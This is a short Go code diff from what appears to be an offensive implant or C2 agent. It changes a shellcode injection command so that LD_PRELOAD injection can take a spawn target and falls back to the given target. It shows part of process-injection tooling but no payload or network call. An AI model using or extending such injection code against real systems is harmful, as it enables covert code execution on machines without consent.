@@ -48,7 +48,11 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 	}
 
 	if strings.EqualFold(params.Action, "ldpreload") {
-		info, err := ldpreloadInject(shellcode, params.Target)
+		target := params.SpawnTarget
+		if target == "" {
+			target = params.Target
+		}
+		info, err := ldpreloadInject(shellcode, target)
 		if err != nil {
 			return errorf("[!] LD_PRELOAD injection failed: %v", err)
 		}
